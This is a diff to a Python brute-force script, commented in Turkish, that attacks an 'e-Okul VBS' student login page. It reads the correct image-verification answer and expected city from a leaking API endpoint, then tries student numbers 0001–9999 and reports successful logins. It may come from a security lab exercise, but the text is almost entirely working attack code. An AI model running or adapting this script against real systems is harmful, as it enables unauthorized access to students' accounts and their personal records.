@@ -23,41 +23,45 @@ LOGIN_URL = f"{BASE_URL}/login"
 VERIFICATION_URL = f"{BASE_URL}/api/verification-data"
 
 # Sabit tutulan değerler (saldırgan bunları bildiğini varsayıyor)
-CITY = "ANKARA"
+# Artık şehir de dinamik geleceği için, Python script içerisinde onu da API'den çekeceğiz.
 
 # Brute-force aralığı
 START = 1
 END = 9999
 
-def get_correct_image_id():
+def get_verification_data():
     """
-    Information Disclosure zafiyetini kullanarak doğru resim ID'sini al.
-    Sunucu, /api/verification-data endpoint'inde doğru cevabı açıkça gönderiyor.
+    Information Disclosure zafiyetini kullanarak doğru resmi ve hedef şehri al.
     """
     try:
         response = requests.get(VERIFICATION_URL)
         data = response.json()
         correct_id = str(data.get("correctImageId"))
-        return correct_id
+        
+        # Eğer sunucu question objesi gönderiyorsa beklenen şehri de alıyoruz
+        expected_city = data.get("question", {}).get("expectedCity")
+        # Eski versiyon uyumluluğu için
+        if not expected_city:
+            expected_city = data.get("_debug", {}).get("city", "ANKARA")
+
+        return correct_id, expected_city
     except Exception as e:
         print(f"  [!] Doğrulama verisi alınamadı: {e}")
-        return None
+        return None, None
 
 def brute_force():
     print("=" * 60)
     print("  e-Okul VBS Brute-Force Saldırısı Başlatılıyor...")
     print("=" * 60)
     print(f"  Hedef      : {LOGIN_URL}")
-    print(f"  Şehir      : {CITY}")
-
-    # Önce Information Disclosure zafiyetini kullanarak doğru resim ID'sini al
-    print()
+    print(f"  Aralık     : {START:04d} - {END:04d}")
     print("  [*] Information Disclosure zafiyeti kullanılıyor...")
-    correct_image_id = get_correct_image_id()
-    if not correct_image_id:
-        print("  [!] Doğru resim ID'si alınamadı, çıkılıyor.")
+    correct_image_id, target_city = get_verification_data()
+    if not correct_image_id or not target_city:
+        print("  [!] Doğru doğrulama verileri alınamadı, çıkılıyor.")
         return
     print(f"  [+] Doğru resim ID'si sızdırıldı: {correct_image_id}")
+    print(f"  [+] Beklenen hedef şehir      : {target_city}")
 
     print(f"  Aralık     : {START:04d} - {END:04d}")
     print("=" * 60)
@@ -77,7 +81,7 @@ def brute_force():
             print(f"  [*] Deneniyor: {student_no}  |  {attempted}/{END} deneme  |  {rate:.0f} istek/sn")
 
         payload = {
-            "city": CITY,
+            "city": target_city,
             "studentNo": student_no,
             "selectedImageId": correct_image_id
         }
@@ -91,8 +95,8 @@ def brute_force():
                 print()
                 print("!" * 60)
                 print(f"  [+] BASARILI GIRIS BULUNDU!")
-                print(f"  [+] Ogrenci Numarasi : {student_no}")
-                print(f"  [+] Sehir            : {CITY}")
+                print(f"  [+] Bulunan Cevap    : {student_no}")
+                print(f"  [+] Sehir            : {target_city}")
                 print(f"  [+] Resim ID         : {correct_image_id}")
                 print(f"  [+] Redirect URL     : {data.get('redirectUrl')}")
                 print(f"  [+] Sunucu Yaniti    : {data.get('message')}")
